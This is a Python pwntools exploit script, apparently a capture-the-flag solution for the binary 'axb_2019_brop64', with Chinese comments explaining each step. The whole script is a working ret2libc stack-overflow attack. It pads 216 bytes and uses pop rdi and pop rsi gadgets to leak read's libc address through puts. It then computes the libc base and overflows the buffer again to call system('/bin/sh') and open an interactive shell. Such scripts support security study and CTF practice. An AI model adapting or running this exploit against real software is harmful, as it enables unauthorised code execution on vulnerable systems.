from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./axb_2019_brop64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

prdi = 0x0000000000400963 #: pop rdi ; ret           # gadget1 
prsi = 0x0000000000400961 #: pop rsi ; pop r15 ; ret # gadget2

read_got = elf.got['read'] # GOT表中READ表项的地址
puts_plt = elf.plt['puts'] # PLT表中PUTS表项的地址
main = elf.sym['main'] # 虽然这里获得的是main函数的相对地址，但pwntools能够跟踪目标程序的加载基地址，并自动将相对地址转换为真实地址

io = process('./axb_2019_brop64')


# 1. 利用PUTS系统调用泄露READ的真实内存地址(前提是READ的真实内存地址已加载到GDT表中，这显然满足)
payload = b'a' * 216
payload += p64(prdi) + p64(read_got) # 插入gadget1，将PUTS系统调用的第一个参数(也是唯一一个)输出字符串地址传给RDI
payload += p64(puts_plt) # 目标函数地址
payload += p64(main) # 返回地址设置成main函数地址，便于第二次栈溢出获取shell(自动进入repeater函数)
io.recvuntil('me:')
io.send(payload)

io.recv(0xe4)
addr = u64(io.recvuntil('\n', drop = True).ljust(8, b'\x00')) # PUTS系统调用会在输出字符串的后面自动加上换行符
log.success(hex(addr))

# 2. 利用READ的真实地址和READ相对libc的偏移地址获得libc的基地址，进而获得其他系统调用的真实内存地址等
libc_base = addr - libc.sym['read']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search('/bin/sh'))
log.success(hex(system))
log.success(hex(binsh))

# 3. 再次利用栈溢出漏洞获取shell
payload = b'a' * 216 
payload += p64(prdi) + p64(binsh) # 插入gadget1，将SYSTEM系统调用的第一个参数命令或程序传给RDI
payload += p64(prsi) + p64(0)*2 # 插入gadget2，将RSI置零(理论上不需要传递第二个参数，但实际调试过程中发现不加会出现卡在内核的情况)
payload += p64(system) # 目标函数地址
payload += p64(main) # 返回地址

gdb.attach(io)
io.sendafter('me:', payload)

io.interactive()
